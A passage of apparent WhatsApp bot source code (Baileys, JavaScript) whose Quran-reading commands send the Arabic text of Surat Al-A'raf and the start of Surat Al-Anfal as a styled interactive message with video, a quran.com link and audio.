وَجٰوَزْنَا بِبَنِيْٓ اِسْرَاۤءِيْلَ الْبَحْرَ فَاَتَوْا عَلٰى قَوْمٍ يَّعْكُفُوْنَ عَلٰٓى اَصْنَامٍ لَّهُمْ ۚ قَالُوْا يٰمُوْسَى اجْعَلْ لَّنَآ اِلٰهًا كَمَا لَهُمْ اٰلِهَةٌ ۗ قَالَ اِنَّكُمْ قَوْمٌ تَجْهَلُوْنَ
اِنَّ هٰٓؤُلَاۤءِ مُتَبَّرٌ مَّا هُمْ فِيْهِ وَبٰطِلٌ مَّا كَانُوْا يَعْمَلُوْنَ
قَالَ اَغَيْرَ اللّٰهِ اَبْغِيْكُمْ اِلٰهًا وَّهُوَ فَضَّلَكُمْ عَلَى الْعٰلَمِيْنَ
وَاِذْ اَنْجَيْنٰكُمْ مِّنْ اٰلِ فِرْعَوْنَ يَسُوْمُوْنَكُمْ سُوْۤءَ الْعَذَابِ يُقَتِّلُوْنَ اَبْنَاۤءَكُمْ وَيَسْتَحْيُوْنَ نِسَاۤءَكُمْ ۗ وَفِيْ ذٰلِكُمْ بَلَاۤءٌ مِّنْ رَّبِّكُمْ عَظِيْمٌ
وَوٰعَدْنَا مُوْسٰى ثَلٰثِيْنَ لَيْلَةً وَّاَتْمَمْنٰهَا بِعَشْرٍ فَتَمَّ مِيْقَاتُ رَبِّهٖٓ اَرْبَعِيْنَ لَيْلَةً ۚ وَقَالَ مُوْسٰى لِاَخِيْهِ هٰرُوْنَ اخْلُفْنِيْ فِيْ قَوْمِيْ وَاَصْلِحْ وَلَا تَتَّبِعْ سَبِيْلَ الْمُفْسِدِيْنَ
وَلَمَّا جَاۤءَ مُوْسٰى لِمِيْقَاتِنَا وَكَلَّمَهٗ رَبُّهٗ ۙ قَالَ رَبِّ اَرِنِيْٓ اَنْظُرْ اِلَيْكَ ۗ قَالَ لَنْ تَرٰىنِيْ وَلٰكِنِ انْظُرْ اِلَى الْجَبَلِ فَاِنِ اسْتَقَرَّ مَكَانَهٗ فَسَوْفَ تَرٰىنِيْ ۚ فَلَمَّا تَجَلّٰى رَبُّهٗ لِلْجَبَلِ جَعَلَهٗ دَكًّا وَّخَرَّ مُوْسٰى صَعِقًا ۚ فَلَمَّآ اَفَاقَ قَالَ سُبْحٰنَكَ تُبْتُ اِلَيْكَ وَاَنَا۠ اَوَّلُ الْمُؤْمِنِيْنَ
قَالَ يٰمُوْسٰىٓ اِنِّي اصْطَفَيْتُكَ عَلَى النَّاسِ بِرِسٰلٰتِيْ وَبِكَلَامِيْ ۖ فَخُذْ مَآ اٰتَيْتُكَ وَكُنْ مِّنَ الشّٰكِرِيْنَ
وَكَتَبْنَا لَهٗ فِى الْاَلْوَاحِ مِنْ كُلِّ شَيْءٍ مَّوْعِظَةً وَّتَفْصِيْلًا لِّكُلِّ شَيْءٍۚ فَخُذْهَا بِقُوَّةٍ وَّأْمُرْ قَوْمَكَ يَأْخُذُوْا بِاَحْسَنِهَا ۗ سَاُورِيْكُمْ دَارَ الْفٰسِقِيْنَ
سَاَصْرِفُ عَنْ اٰيٰتِيَ الَّذِيْنَ يَتَكَبَّرُوْنَ فِى الْاَرْضِ بِغَيْرِ الْحَقِّ ۗ وَاِنْ يَّرَوْا كُلَّ اٰيَةٍ لَّا يُؤْمِنُوْا بِهَا ۚ وَاِنْ يَّرَوْا سَبِيْلَ الرُّشْدِ لَا يَتَّخِذُوْهُ سَبِيْلًا ۚ وَاِنْ يَّرَوْا سَبِيْلَ الْغَيِّ يَتَّخِذُوْهُ سَبِيْلًا ۗ ذٰلِكَ بِاَنَّهُمْ كَذَّبُوْا بِاٰيٰتِنَا وَكَانُوْا عَنْهَا غٰفِلِيْنَ
وَالَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا وَلِقَاۤءِ الْاٰخِرَةِ حَبِطَتْ اَعْمَالُهُمْ ۗ هَلْ يُجْزَوْنَ اِلَّا مَا كَانُوْا يَعْمَلُوْنَ
وَاتَّخَذَ قَوْمُ مُوْسٰى مِنْۢ بَعْدِهٖ مِنْ حُلِيِّهِمْ عِجْلًا جَسَدًا لَّهٗ خُوَارٌ ۗ اَلَمْ يَرَوْا اَنَّهٗ لَا يُكَلِّمُهُمْ وَلَا يَهْدِيْهِمْ سَبِيْلًا ۘ اِتَّخَذُوْهُ وَكَانُوْا ظٰلِمِيْنَ
وَلَمَّا سُقِطَ فِيْٓ اَيْدِيْهِمْ وَرَاَوْا اَنَّهُمْ قَدْ ضَلُّوْا قَالُوْا لَىِٕنْ لَّمْ يَرْحَمْنَا رَبُّنَا وَيَغْفِرْ لَنَا لَنَكُوْنَنَّ مِنَ الْخٰسِرِيْنَ
وَلَمَّا رَجَعَ مُوْسٰىٓ اِلٰى قَوْمِهٖ غَضْبَانَ اَسِفًا قَالَ بِئْسَمَا خَلَفْتُمُوْنِيْ مِنْۢ بَعْدِيْ ۚ اَعَجِلْتُمْ اَمْرَ رَبِّكُمْ ۚ وَاَلْقَى الْاَلْوَاحَ وَاَخَذَ بِرَأْسِ اَخِيْهِ يَجُرُّهٗٓ اِلَيْهِ ۗ قَالَ ابْنَ اُمَّ اِنَّ الْقَوْمَ اسْتَضْعَفُوْنِيْ وَكَادُوْا يَقْتُلُوْنَنِيْ ۖ فَلَا تُشْمِتْ بِيَ الْاَعْدَاۤءَ وَلَا تَجْعَلْنِيْ مَعَ الْقَوْمِ الظّٰلِمِيْنَ
قَالَ رَبِّ اغْفِرْ لِيْ وَلِاَخِيْ وَاَدْخِلْنَا فِيْ رَحْمَتِكَ ۖ وَاَنْتَ اَرْحَمُ الرّٰحِمِيْنَ
اِنَّ الَّذِيْنَ اتَّخَذُوا الْعِجْلَ سَيَنَالُهُمْ غَضَبٌ مِّنْ رَّبِّهِمْ وَذِلَّةٌ فِى الْحَيٰوةِ الدُّنْيَا ۗ وَكَذٰلِكَ نَجْزِى الْمُفْتَرِيْنَ
وَالَّذِيْنَ عَمِلُوا السَّيِّاٰتِ ثُمَّ تَابُوْا مِنْۢ بَعْدِهَا وَاٰمَنُوْٓا ۖ اِنَّ رَبَّكَ مِنْۢ بَعْدِهَا لَغَفُوْرٌ رَّحِيْمٌ
وَلَمَّا سَكَتَ عَنْ مُّوْسَى الْغَضَبُ اَخَذَ الْاَلْوَاحَ ۚ وَفِيْ نُسْخَتِهَا هُدًى وَّرَحْمَةٌ لِّلَّذِيْنَ هُمْ لِرَبِّهِمْ يَرْهَبُوْنَ
وَاخْتَارَ مُوْسٰى قَوْمَهٗ سَبْعِيْنَ رَجُلًا لِّمِيْقَاتِنَا ۚ فَلَمَّآ اَخَذَتْهُمُ الرَّجْفَةُ قَالَ رَبِّ لَوْ شِئْتَ اَهْلَكْتَهُمْ مِّنْ قَبْلُ وَاِيَّايَ ۗ اَتُهْلِكُنَا بِمَا فَعَلَ السُّفَهَاۤءُ مِنَّا ۚ اِنْ هِيَ اِلَّا فِتْنَتُكَ ۚ تُضِلُّ بِهَا مَنْ تَشَاۤءُ وَتَهْدِيْ مَنْ تَشَاۤءُ ۚ اَنْتَ وَلِيُّنَا فَاغْفِرْ لَنَا وَارْحَمْنَا وَاَنْتَ خَيْرُ الْغٰفِرِيْنَ
وَاكْتُبْ لَنَا فِيْ هٰذِهِ الدُّنْيَا حَسَنَةً وَّفِى الْاٰخِرَةِ اِنَّا هُدْنَآ اِلَيْكَ ۗ قَالَ عَذَابِيْٓ اُصِيْبُ بِهٖ مَنْ اَشَاۤءُ ۚ وَرَحْمَتِيْ وَسِعَتْ كُلَّ شَيْءٍ ۗ فَسَاَكْتُبُهَا لِلَّذِيْنَ يَتَّقُوْنَ وَيُؤْتُوْنَ الزَّكٰوةَ وَالَّذِيْنَ هُمْ بِاٰيٰتِنَا يُؤْمِنُوْنَ
اَلَّذِيْنَ يَتَّبِعُوْنَ الرَّسُوْلَ النَّبِيَّ الْاُمِّيَّ الَّذِيْ يَجِدُوْنَهٗ مَكْتُوْبًا عِنْدَهُمْ فِى التَّوْرٰىةِ وَالْاِنْجِيْلِ يَأْمُرُهُمْ بِالْمَعْرُوْفِ وَيَنْهٰىهُمْ عَنِ الْمُنْكَرِ وَيُحِلُّ لَهُمُ الطَّيِّبٰتِ وَيُحَرِّمُ عَلَيْهِمُ الْخَبٰۤىِٕثَ وَيَضَعُ عَنْهُمْ اِصْرَهُمْ وَالْاَغْلٰلَ الَّتِيْ كَانَتْ عَلَيْهِمْ ۗ فَالَّذِيْنَ اٰمَنُوْا بِهٖ وَعَزَّرُوْهُ وَنَصَرُوْهُ وَاتَّبَعُوا النُّوْرَ الَّذِيْٓ اُنْزِلَ مَعَهٗٓ ۙ اُولٰۤىِٕكَ هُمُ الْمُفْلِحُوْنَ
قُلْ يٰٓاَيُّهَا النَّاسُ اِنِّيْ رَسُوْلُ اللّٰهِ اِلَيْكُمْ جَمِيْعًا ِۨالَّذِيْ لَهٗ مُلْكُ السَّمٰوٰتِ وَالْاَرْضِ ۚ لَآ اِلٰهَ اِلَّا هُوَ يُحْيٖ وَيُمِيْتُ ۖ فَاٰمِنُوْا بِاللّٰهِ وَرَسُوْلِهِ النَّبِيِّ الْاُمِّيِّ الَّذِيْ يُؤْمِنُ بِاللّٰهِ وَكَلِمٰتِهٖ وَاتَّبِعُوْهُ لَعَلَّكُمْ تَهْتَدُوْنَ
وَمِنْ قَوْمِ مُوْسٰىٓ اُمَّةٌ يَّهْدُوْنَ بِالْحَقِّ وَبِهٖ يَعْدِلُوْنَ
وَقَطَّعْنٰهُمُ اثْنَتَيْ عَشْرَةَ اَسْبَاطًا اُمَمًا ۗ وَاَوْحَيْنَآ اِلٰى مُوْسٰىٓ اِذِ اسْتَسْقٰىهُ قَوْمُهٗٓ اَنِ اضْرِبْ بِّعَصَاكَ الْحَجَرَ ۚ فَانْۢبَجَسَتْ مِنْهُ اثْنَتَا عَشْرَةَ عَيْنًا ۗ قَدْ عَلِمَ كُلُّ اُنَاسٍ مَّشْرَبَهُمْ ۗ وَظَلَّلْنَا عَلَيْهِمُ الْغَمَامَ وَاَنْزَلْنَا عَلَيْهِمُ الْمَنَّ وَالسَّلْوٰى ۗ كُلُوْا مِنْ طَيِّبٰتِ مَا رَزَقْنٰكُمْ ۗ وَمَا ظَلَمُوْنَا وَلٰكِنْ كَانُوْٓا اَنْفُسَهُمْ يَظْلِمُوْنَ
وَاِذْ قِيْلَ لَهُمُ اسْكُنُوْا هٰذِهِ الْقَرْيَةَ وَكُلُوْا مِنْهَا حَيْثُ شِئْتُمْ وَقُوْلُوْا حِطَّةٌ وَّادْخُلُوا الْبَابَ سُجَّدًا نَّغْفِرْ لَكُمْ خَطِيْۤـٰٔتِكُمْ ۗ سَنَزِيْدُ الْمُحْسِنِيْنَ
فَبَدَّلَ الَّذِيْنَ ظَلَمُوْا مِنْهُمْ قَوْلًا غَيْرَ الَّذِيْ قِيْلَ لَهُمْ فَاَرْسَلْنَا عَلَيْهِمْ رِجْزًا مِّنَ السَّمَاۤءِ بِمَا كَانُوْا يَظْلِمُوْنَ
وَسْـَٔلْهُمْ عَنِ الْقَرْيَةِ الَّتِيْ كَانَتْ حَاضِرَةَ الْبَحْرِ ۘ اِذْ يَعْدُوْنَ فِى السَّبْتِ اِذْ تَأْتِيْهِمْ حِيْتَانُهُمْ يَوْمَ سَبْتِهِمْ شُرَّعًا وَّيَوْمَ لَا يَسْبِتُوْنَ لَا تَأْتِيْهِمْ ۚ كَذٰلِكَ نَبْلُوْهُمْ بِمَا كَانُوْا يَفْسُقُوْنَ
وَاِذْ قَالَتْ اُمَّةٌ مِّنْهُمْ لِمَ تَعِظُوْنَ قَوْمًا ۙ اللّٰهُ مُهْلِكُهُمْ اَوْ مُعَذِّبُهُمْ عَذَابًا شَدِيْدًا ۗ قَالُوْا مَعْذِرَةً اِلٰى رَبِّكُمْ وَلَعَلَّهُمْ يَتَّقُوْنَ
فَلَمَّا نَسُوْا مَا ذُكِّرُوْا بِهٖٓ اَنْجَيْنَا الَّذِيْنَ يَنْهَوْنَ عَنِ السُّوْۤءِ وَاَخَذْنَا الَّذِيْنَ ظَلَمُوْا بِعَذَابٍۢ بَئِيْسٍۢ بِمَا كَانُوْا يَفْسُقُوْنَ
فَلَمَّا عَتَوْا عَنْ مَّا نُهُوْا عَنْهُ قُلْنَا لَهُمْ كُوْنُوْا قِرَدَةً خٰسِـِٔيْنَ
وَاِذْ تَاَذَّنَ رَبُّكَ لَيَبْعَثَنَّ عَلَيْهِمْ اِلٰى يَوْمِ الْقِيٰمَةِ مَنْ يَّسُوْمُهُمْ سُوْۤءَ الْعَذَابِ ۗ اِنَّ رَبَّكَ لَسَرِيْعُ الْعِقَابِ ۖ وَاِنَّهٗ لَغَفُوْرٌ رَّحِيْمٌ
وَقَطَّعْنٰهُمْ فِى الْاَرْضِ اُمَمًا ۚ مِنْهُمُ الصّٰلِحُوْنَ وَمِنْهُمْ دُوْنَ ذٰلِكَ ۖ وَبَلَوْنٰهُمْ بِالْحَسَنٰتِ وَالسَّيِّاٰتِ لَعَلَّهُمْ يَرْجِعُوْنَ
فَخَلَفَ مِنْۢ بَعْدِهِمْ خَلْفٌ وَّرِثُوا الْكِتٰبَ يَأْخُذُوْنَ عَرَضَ هٰذَا الْاَدْنٰى وَيَقُوْلُوْنَ سَيُغْفَرُ لَنَا ۚ وَاِنْ يَّأْتِهِمْ عَرَضٌ مِّثْلُهٗ يَأْخُذُوْهُ ۗ اَلَمْ يُؤْخَذْ عَلَيْهِمْ مِّيْثَاقُ الْكِتٰبِ اَنْ لَّا يَقُوْلُوْا عَلَى اللّٰهِ اِلَّا الْحَقَّ وَدَرَسُوْا مَا فِيْهِ ۗ وَالدَّارُ الْاٰخِرَةُ خَيْرٌ لِّلَّذِيْنَ يَتَّقُوْنَ ۗ اَفَلَا تَعْقِلُوْنَ
وَالَّذِيْنَ يُمَسِّكُوْنَ بِالْكِتٰبِ وَاَقَامُوا الصَّلٰوةَ ۗ اِنَّا لَا نُضِيْعُ اَجْرَ الْمُصْلِحِيْنَ
وَاِذْ نَتَقْنَا الْجَبَلَ فَوْقَهُمْ كَاَنَّهٗ ظُلَّةٌ وَّظَنُّوْٓا اَنَّهٗ وَاقِعٌ ۢ بِهِمْ ۚ خُذُوْا مَآ اٰتَيْنٰكُمْ بِقُوَّةٍ وَّاذْكُرُوْا مَا فِيْهِ لَعَلَّكُمْ تَتَّقُوْنَ
وَاِذْ اَخَذَ رَبُّكَ مِنْۢ بَنِيْٓ اٰدَمَ مِنْ ظُهُوْرِهِمْ ذُرِّيَّتَهُمْ وَاَشْهَدَهُمْ عَلٰٓى اَنْفُسِهِمْۚ اَلَسْتُ بِرَبِّكُمْ ۗ قَالُوْا بَلٰى ۛ شَهِدْنَا ۛ اَنْ تَقُوْلُوْا يَوْمَ الْقِيٰمَةِ اِنَّا كُنَّا عَنْ هٰذَا غٰفِلِيْنَ
اَوْ تَقُوْلُوْٓا اِنَّمَآ اَشْرَكَ اٰبَاۤؤُنَا مِنْ قَبْلُ وَكُنَّا ذُرِّيَّةً مِّنْۢ بَعْدِهِمْ ۚ اَفَتُهْلِكُنَا بِمَا فَعَلَ الْمُبْطِلُوْنَ
وَكَذٰلِكَ نُفَصِّلُ الْاٰيٰتِ وَلَعَلَّهُمْ يَرْجِعُوْنَ
وَاتْلُ عَلَيْهِمْ نَبَاَ الَّذِيْٓ اٰتَيْنٰهُ اٰيٰتِنَا فَانْسَلَخَ مِنْهَا فَاَتْبَعَهُ الشَّيْطٰنُ فَكَانَ مِنَ الْغٰوِيْنَ
وَلَوْ شِئْنَا لَرَفَعْنٰهُ بِهَا وَلٰكِنَّهٗٓ اَخْلَدَ اِلَى الْاَرْضِ وَاتَّبَعَ هَوٰىهُ ۚ فَمَثَلُهٗ كَمَثَلِ الْكَلْبِ ۚ اِنْ تَحْمِلْ عَلَيْهِ يَلْهَثْ اَوْ تَتْرُكْهُ يَلْهَثْ ۗ ذٰلِكَ مَثَلُ الْقَوْمِ الَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا ۚ فَاقْصُصِ الْقَصَ لَعَلَّهُمْ يَتَفَكَّرُوْنَ
سَاۤءَ مَثَلًا ِۨالْقَوْمُ الَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا وَاَنْفُسَهُمْ كَانُوْا يَظْلِمُوْنَ
مَنْ يَّهْدِ اللّٰهُ فَهُوَ الْمُهْتَدِيْ ۚ وَمَنْ يُّضْلِلْ فَاُولٰۤىِٕكَ هُمُ الْخٰسِرُوْنَ
وَلَقَدْ ذَرَأْنَا لِجَهَنَّمَ كَثِيْرًا مِّنَ الْجِنِّ وَالْاِنْسِ ۖ لَهُمْ قُلُوْبٌ لَّا يَفْقَهُوْنَ بِهَا ۖ وَلَهُمْ اَعْيُنٌ لَّا يُبْصِرُوْنَ بِهَا ۖ وَلَهُمْ اٰذَانٌ لَّا يَسْمَعُوْنَ بِهَا ۗ اُولٰۤىِٕكَ كَالْاَنْعَامِ بَلْ هُمْ اَضَلُّ ۗ اُولٰۤىِٕكَ هُمُ الْغٰفِلُوْنَ
وَلِلّٰهِ الْاَسْمَاۤءُ الْحُسْنٰى فَادْعُوْهُ بِهَا ۖ وَذَرُوا الَّذِيْنَ يُلْحِدُوْنَ فِيْٓ اَسْمَاۤىِٕهٖ ۗ سَيُجْزَوْنَ مَا كَانُوْا يَعْمَلُوْنَ
وَمِمَّنْ خَلَقْنَآ اُمَّةٌ يَّهْدُوْنَ بِالْحَقِّ وَبِهٖ يَعْدِلُوْنَ
وَالَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا سَنَسْتَدْرِجُهُمْ مِّنْ حَيْثُ لَا يَعْلَمُوْنَ
وَاُمْلِيْ لَهُمْ ۗ اِنَّ كَيْدِيْ مَتِيْنٌ
اَوَلَمْ يَتَفَكَّرُوْا ۗ مَا بِصَاحِبِهِمْ مِّنْ جِنَّةٍ ۗ اِنْ هُوَ اِلَّا نَذِيْرٌ مُّبِيْنٌ
اَوَلَمْ يَنْظُرُوْا فِيْ مَلَكُوْتِ السَّمٰوٰتِ وَالْاَرْضِ وَمَا خَلَقَ اللّٰهُ مِنْ شَيْءٍ ۙ وَّاَنْ عَسٰٓى اَنْ يَّكُوْنَ قَدِ اقْتَرَبَ اَجَلُهُمْ ۚ فَبِاَيِّ حَدِيْثٍۢ بَعْدَهٗ يُؤْمِنُوْنَ
مَنْ يُّضْلِلِ اللّٰهُ فَلَا هَادِيَ لَهٗ ۗ وَيَذَرُهُمْ فِيْ طُغْيَانِهِمْ يَعْمَهُوْنَ
يَسْـَٔلُوْنَكَ عَنِ السَّاعَةِ اَيَّانَ مُرْسٰىهَا ۗ قُلْ اِنَّمَا عِلْمُهَا عِنْدَ رَبِّيْ ۚ لَا يُجَلِّيْهَا لِوَقْتِهَآ اِلَّا هُوَ ۘ ثَقُلَتْ فِى السَّمٰوٰتِ وَالْاَرْضِ ۗ لَا تَأْتِيْكُمْ اِلَّا بَغْتَةً ۗ يَسْـَٔلُوْنَكَ كَاَنَّكَ حَفِيٌّ عَنْهَا ۗ قُلْ اِنَّمَا عِلْمُهَا عِنْدَ اللّٰهِ وَلٰكِنَّ اَكْثَرَ النَّاسِ لَا يَعْلَمُوْنَ
قُلْ لَّآ اَمْلِكُ لِنَفْسِيْ نَفْعًا وَّلَا ضَرًّا اِلَّا مَا شَاۤءَ اللّٰهُ ۗ وَلَوْ كُنْتُ اَعْلَمُ الْغَيْبَ لَاسْتَكْثَرْتُ مِنَ الْخَيْرِۖ وَمَا مَسَّنِيَ السُّوْۤءُ ۚ اِنْ اَنَا۠ اِلَّا نَذِيْرٌ وَّبَشِيْرٌ لِّقَوْمٍ يُّؤْمِنُوْنَ
هُوَ الَّذِيْ خَلَقَكُمْ مِّنْ نَّفْسٍ وَّاحِدَةٍ وَّجَعَلَ مِنْهَا زَوْجَهَا لِيَسْكُنَ اِلَيْهَا ۚ فَلَمَّا تَغَشّٰىهَا حَمَلَتْ حَمْلًا خَفِيْفًا فَمَرَّتْ بِهٖ ۚ فَلَمَّآ اَثْقَلَتْ دَّعَوَا اللّٰهَ رَبَّهُمَا لَىِٕنْ اٰتَيْتَنَا صَالِحًا لَّنَكُوْنَنَّ مِنَ الشّٰكِرِيْنَ
فَلَمَّآ اٰتٰىهُمَا صَالِحًا جَعَلَا لَهٗ شُرَكَاۤءَ فِيْمَآ اٰتٰىهُمَا ۚ فَتَعٰلَى اللّٰهُ عَمَّا يُشْرِكُوْنَ
اَيُشْرِكُوْنَ مَا لَا يَخْلُقُ شَيْـًٔا وَّهُمْ يُخْلَقُوْنَ
وَلَا يَسْتَطِيْعُوْنَ لَهُمْ نَصْرًا وَّلَآ اَنْفُسَهُمْ يَنْصُرُوْنَ
وَاِنْ تَدْعُوْهُمْ اِلَى الْهُدٰى لَا يَتَّبِعُوْكُمْ ۗ سَوَاۤءٌ عَلَيْكُمْ اَدَعَوْتُمُوْهُمْ اَمْ اَنْتُمْ صَامِتُوْنَ
اِنَّ الَّذِيْنَ تَدْعُوْنَ مِنْ دُوْنِ اللّٰهِ عِبَادٌ اَمْثَالُكُمْ فَادْعُوْهُمْ فَلْيَسْتَجِيْبُوْا لَكُمْ اِنْ كُنْتُمْ صٰدِقِيْنَ
اَلَهُمْ اَرْجُلٌ يَّمْشُوْنَ بِهَآ اَمْ لَهُمْ اَيْدٍ يَّبْطِشُوْنَ بِهَآ اَمْ لَهُمْ اَعْيُنٌ يُّبْصِرُوْنَ بِهَآ اَمْ لَهُمْ اٰذَانٌ يَّسْمَعُوْنَ بِهَا ۗ قُلِ ادْعُوْا شُرَكَاۤءَكُمْ ثُمَّ كِيْدُوْنِ فَلَا تُنْظِرُوْنِ
اِنَّ وَلِيَِّۧ اللّٰهُ الَّذِيْ نَزَّلَ الْكِتٰبَ ۖ وَهُوَ يَتَوَلَّى الصّٰلِحِيْنَ
وَالَّذِيْنَ تَدْعُوْنَ مِنْ دُوْنِهٖ لَا يَسْتَطِيْعُوْنَ نَصْرَكُمْ وَلَآ اَنْفُسَهُمْ يَنْصُرُوْنَ
وَاِنْ تَدْعُوْهُمْ اِلَى الْهُدٰى لَا يَسْمَعُوْا ۗ وَتَرٰىهُمْ يَنْظُرُوْنَ اِلَيْكَ وَهُمْ لَا يُبْصِرُوْنَ
خُذِ الْعَفْوَ وَأْمُرْ بِالْعُرْفِ وَاَعْرِضْ عَنِ الْجٰهِلِيْنَ
وَاِمَّا يَنْزَغَنَّكَ مِنَ الشَّيْطٰنِ نَزْغٌ فَاسْتَعِذْ بِاللّٰهِ ۗ اِنَّهٗ سَمِيْعٌ عَلِيْمٌ
اِنَّ الَّذِيْنَ اتَّقَوْا اِذَا مَسَّهُمْ طٰۤىِٕفٌ مِّنَ الشَّيْطٰنِ تَذَكَّرُوْا فَاِذَا هُمْ مُّبْصِرُوْنَ
وَاِخْوَانُهُمْ يَمُدُّوْنَهُمْ فِى الْغَيِّ ثُمَّ لَا يُقْصِرُوْنَ
وَاِذَا لَمْ تَأْتِهِمْ بِاٰيَةٍ قَالُوْا لَوْلَا اجْتَبَيْتَهَا ۗ قُلْ اِنَّمَآ اَتَّبِعُ مَا يُوْحٰىٓ اِلَيَّ مِنْ رَّبِّيْ ۚ هٰذَا بَصَاۤىِٕرُ مِنْ رَّبِّكُمْ وَهُدًى وَّرَحْمَةٌ لِّقَوْمٍ يُّؤْمِنُوْنَ
وَاِذَا قُرِئَ الْقُرْاٰنُ فَاسْتَمِعُوْا لَهٗ وَاَنْصِتُوْا لَعَلَّكُمْ تُرْحَمُوْنَ
وَاذْكُرْ رَّبَّكَ فِيْ نَفْسِكَ تَضَرُّعًا وَّخِيْفَةً وَّدُوْنَ الْجَهْرِ مِنَ الْقَوْلِ بِالْغُدُوِّ وَالْاٰصَالِ وَلَا تَكُنْ مِّنَ الْغٰفِلِيْنَ
اِنَّ الَّذِيْنَ عِنْدَ رَبِّكَ لَا يَسْتَكْبِرُوْنَ عَنْ عِبَادَتِهٖ وَيُسَبِّحُوْنَهٗ وَلَهٗ يَسْجُدُوْنَ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐋-𝐀'𝐑𝐀𝐅",
 url: `https://quran.com/7`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© AL-A'RAF"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AL-A'RAF",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 188-206", id: `${prefix}al-araf` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'al-anfal':
case 'alanfal':
case 'anfal': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗔𝗡𝗙𝗔𝗟\`
Surat ke-8 | 75 ayat | Madaniyah | Harta Rampasan Perang

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁 𝐋𝐄𝐍𝐆𝐊𝐀𝐏\`
بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
يَسْـَٔلُوْنَكَ عَنِ الْاَنْفَالِ ۗ قُلِ الْاَنْفَالُ لِلّٰهِ وَالرَّسُوْلِ ۚ فَاتَّقُوا اللّٰهَ وَاَصْلِحُوْا ذَاتَ بَيْنِكُمْ ۖ وَاَطِيْعُوا اللّٰهَ وَرَسُوْلَهٗٓ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
اِنَّمَا الْمُؤْمِنُوْنَ الَّذِيْنَ اِذَا ذُكِرَ اللّٰهُ وَجِلَتْ قُلُوْبُهُمْ وَاِذَا تُلِيَتْ عَلَيْهِمْ اٰيٰتُهٗ زَادَتْهُمْ اِيْمَانًا وَّعَلٰى رَبِّهِمْ يَتَوَكَّلُوْنَ
الَّذِيْنَ يُقِيْمُوْنَ الصَّلٰوةَ وَمِمَّا رَزَقْنٰهُمْ يُنْفِقُوْنَ
اُولٰۤىِٕكَ هُمُ الْمُؤْمِنُوْنَ حَقًّا ۗ لَهُمْ دَرَجٰتٌ عِنْدَ رَبِّهِمْ وَمَغْفِرَةٌ وَّرِزْقٌ كَرِيْمٌ
كَمَآ اَخْرَجَكَ رَبُّكَ مِنْۢ بَيْتِكَ بِالْحَقِّ ۖ وَاِنَّ فَرِيْقًا مِّنَ الْمُؤْمِنِيْنَ لَكٰرِهُوْنَ
يُجَادِلُوْنَكَ فِى الْحَقِّ بَعْدَ مَا تَبَيَّنَ كَاَنَّمَا يُسَاقُوْنَ اِلَى الْمَوْتِ وَهُمْ يَنْظُرُوْنَ
وَاِذْ يَعِدُكُمُ اللّٰهُ اِحْدَى الطَّاۤىِٕفَتَيْنِ اَنَّهَا لَكُمْ وَتَوَدُّوْنَ اَنَّ غَيْرَ ذَاتِ الشَّوْكَةِ تَكُوْنُ لَكُمْ وَيُرِيْدُ اللّٰهُ اَنْ يُّحِقَّ الْحَقَّ بِكَلِمٰتِهٖ وَيَقْطَعَ دَابِرَ الْكٰفِرِيْنَ
لِيُحِقَّ الْحَقَّ وَيُبْطِلَ الْبَاطِلَ وَلَوْ كَرِهَ الْمُجْرِمُوْنَ
اِذْ تَسْتَغِيْثُوْنَ رَبَّكُمْ فَاسْتَجَابَ لَكُمْ اَنِّيْ مُمِدُّكُمْ بِاَلْفٍ مِّنَ الْمَلٰۤىِٕكَةِ مُرْدِفِيْنَ
وَمَا جَعَلَهُ اللّٰهُ اِلَّا بُشْرٰى وَلِتَطْمَىِٕنَّ بِهٖ قُلُوْبُكُمْ ۚ وَمَا النَّصْرُ اِلَّا مِنْ عِنْدِ اللّٰهِ ۗ اِنَّ اللّٰهَ عَزِيْزٌ حَكِيْمٌ
